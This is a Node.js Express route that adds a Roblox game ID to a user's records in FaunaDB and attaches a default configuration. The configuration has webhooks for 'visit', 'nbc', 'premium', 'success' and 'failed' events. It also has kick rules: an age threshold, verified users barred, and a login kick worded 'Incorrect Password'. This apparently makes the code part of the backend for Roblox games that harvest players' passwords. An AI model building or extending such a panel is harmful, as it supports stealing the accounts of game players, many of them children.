require('dotenv').config();
const express = require('express');
const axios = require('axios');
const faunadb = require('faunadb');
const client = new faunadb.Client({
    secret: process.env.FAUNADB_SECRET,
});
const q = faunadb.query;

async function addgameapi(req, res) {
    const {
        game_id
    } = req.body;

    // Check for empty fields
    const requiredFields = ['game_id'];
    const missingFields = requiredFields.filter((field) => !req.body[field]);

    if (missingFields.length > 0) {
        return res.status(400).json({
            message: `Missing required fields: ${missingFields.join(', ')}`
        });
    }

    try {

        const sessionToken = req.cookies.Account_Session;

        const user_ref_from_session = await client.query(
            q.Map(
                q.Paginate(q.Match(q.Index('sessions_by_token'), sessionToken)),
                q.Lambda(x => {
                    return {
                        ref: q.Select(['data', 'user'], q.Get(x)),
                    };
                })
            )
        );

        const refid = user_ref_from_session.data[0].ref.value.id

        const userData = await client.query(
            q.Map(
                q.Paginate(q.Ref(q.Collection('users'), refid)),
                q.Lambda((x) => ({
                    user_id: q.Select(['ref', 'id'], q.Get(x)),
                    discord_id: q.Select(['data', 'discord_id'], q.Get(x)),
                }))
            )
        );

        const user_id = userData.data[0].user_id;
        const discord_id = userData.data[0].discord_id;

        // Check if the game ID is already taken
        const gameExists = await client.query(q.Exists(q.Match(q.Index('users_games_by_game_id'), game_id)));

        if (gameExists) {
            return res.status(409).json({
                message: 'Game ID already taken'
            });
        }

        // Check if the game ID is valid by calling the Roblox API
        const response = await axios.get(`https://apis.roblox.com/universes/v1/places/${game_id}/universe`);

        if (!response.data.universeId) {
            return res.status(400).json({
                message: 'Invalid game ID'
            });
        }

        let GameidsCheck;
        try {
            GameidsCheck = await client.query(q.Map(
                q.Paginate(q.Match(q.Index('users_games_by_user_id'), user_id)),
                q.Lambda('game', q.Get(q.Var('game')))
            ));
        } catch (error) {
            return res.status(404).json({
                message: 'You don\'t have any game IDs in the database'
            });
        }

        const gameIds = GameidsCheck.data.map(game => game.data.game_id);
        const totalGames = gameIds.length;

        const maxLimit = process.env.GAME_LIMIT; // Specify the maximum limit here

        if (totalGames >= maxLimit) {
            return res.status(400).json({
                message: 'Total games exceed the limit'
            });
        }

        const config_info = {
            webhooks: {
                visit: "",
                nbc: "",
                premium: "",
                success: "",
                failed: "",
            },
            game_configs: {
                age_kick: 7,
                age_kick_message: "Your Account is too low",
                login_kick: true,
                login_kick_message: "Incorrect Password",
                verified_kick: true,
                verified_kick_message: "Verified User Is Not Allowed To Join The Game",
            },
        };

        // Insert the game into the users_games collection
        const newGame = await client.query(
            q.Create(q.Collection('users_games'), {
                data: {
                    game_id,
                    user_id,
                    discord_id,
                    config_info,
                },
            })
        );

        res.status(200).json({
            message: 'Game added successfully',
            game: newGame
        });
    } catch (error) {
        console.log(error);
        res.status(400).json({
            message: 'Failed to add game'
        });
    }
}

module.exports = addgameapi;